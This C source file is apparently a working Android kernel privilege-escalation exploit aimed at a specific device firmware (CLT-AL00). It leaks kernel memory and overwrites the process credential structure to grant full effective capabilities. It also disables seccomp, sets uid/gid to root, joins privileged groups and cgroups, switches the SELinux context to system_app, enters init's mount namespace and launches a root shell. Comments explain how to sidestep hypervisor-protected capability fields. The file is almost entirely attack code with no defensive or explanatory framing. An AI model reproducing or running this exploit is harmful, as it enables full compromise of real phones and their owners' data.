#include "common.c"

void patch_cred(uint64_t addr) {
	uint32_t data [] = {
		1000, //uid
		1000, //gid
		1000, //suid
		1000, //sgid
		1000, //euid
		1000, //egid
		1000, //fsuid
		1000, //fsgid
		1 << 2, //securebits (NO_SETUID_FIXUP)
		0, //cap_inheritable (protected by hypervisor)
		0,
		0, //cap_permitted (protected by hypervisor)
		0,
		0xffffffff, //cap_effective (NOT protected)
		0x3f,
		0xffffffff, //cap_bset
		0x3f,
	};
	kernel_write(addr + CRED_uid, data, sizeof(data));
}

void patch_seccomp(uint8_t *buf) {
	uint64_t kti_offset;
	kernel_read(ADDR_kti_offset + offset, &kti_offset, 8);
	uint64_t thread_info = *(uint64_t *)(buf + TASK_stack) + kti_offset;

	uint64_t data[] = { 0, 0 };
	kernel_write(thread_info + THREAD_flags, data, 8);

	uint64_t task;
	kernel_read(thread_info + THREAD_task, &task, 8);
	kernel_write(task + TASK_seccomp, data, 16);
}

int main(int argc, char ** argv) {
	initialize();
	uint8_t buf[PAGE_SIZE];
	uint8_t buf2[PAGE_SIZE];
	int retry = 0;
	while(leak_data(buf) != PAGE_SIZE) {
		if(++retry == 3)
			errx(1, "leak failed");
	}
	//hexdump(buf);

	uint64_t cred_addr = *(uint64_t *)(buf + TASK_cred);
	if (cred_addr < 0xF000000000000000)
		errx(1, "invalid cred_addr");

	kernel_read(cred_addr, buf2, CRED_SIZE);
	if (*(uint32_t *)(buf2 + CRED_uid) != getuid())
		errx(1, "getcred error");
	offset = *(uint64_t *)(buf2 + CRED_user_ns) - ADDR_init_user_ns;

	patch_cred(cred_addr);

	//seccomp patching
	int seccomp_mode = *(uint32_t *)(buf + TASK_seccomp);
	if (seccomp_mode)
		patch_seccomp(buf);

	// works because we have CAP_SETUID/CAP_SETGID in cap_effective
	setresgid(0, 0, 0);
	// you will lose capabilities if calling setuid without securebit NO_SETUID_FIXUP
	setresuid(0, 0, 0);
	gid_t group[] = {1004, 1007, 3002, 3003, 9997};
	setgroups(5, group);

	//change cgroup
	char pid[16];
	int len = snprintf(pid, sizeof(pid), "%d", getpid());
	fd = open("/sys/fs/cgroup/pids/cgroup.procs", O_WRONLY);
	write(fd, pid, len);
	close(fd);
	fd = open("/dev/blkio/cgroup.procs", O_WRONLY);
	write(fd, pid, len);
	close(fd);
	fd = open("/dev/cpuset/cgroup.procs", O_WRONLY);
	write(fd, pid, len);
	close(fd);
	fd = open("/dev/stune/cgroup.procs", O_WRONLY);
	write(fd, pid, len);
	close(fd);
	fd = open("/acct/cgroup.procs", O_WRONLY);
	write(fd, pid, len);
	close(fd);

	//change selinux context
	fd = open("/proc/self/attr/current", O_WRONLY);
	const char con[] = "u:r:system_app:s0";
	write(fd, con, sizeof(con));
	close(fd);

	//change mount namespace
	char cwd[PATH_MAX];
	getcwd(cwd, sizeof(cwd));
	fd = open("/proc/1/ns/mnt", O_RDONLY | O_CLOEXEC);
	setns(fd, 0);
	chdir(cwd);

	signal(SIGCHLD, SIG_DFL);
	// exec only works if /system is mounted suid, which is the case for CLT-AL00/176(C00)
	// to exec binary in nosuid mountpoint, patch task->cred again with cap_permitted=FULL_CAPSET
	if (argc > 1)
		execvp("/system/bin/sh", argv);
	execlp("/system/bin/sh", "sh", NULL);
	return 0;
}
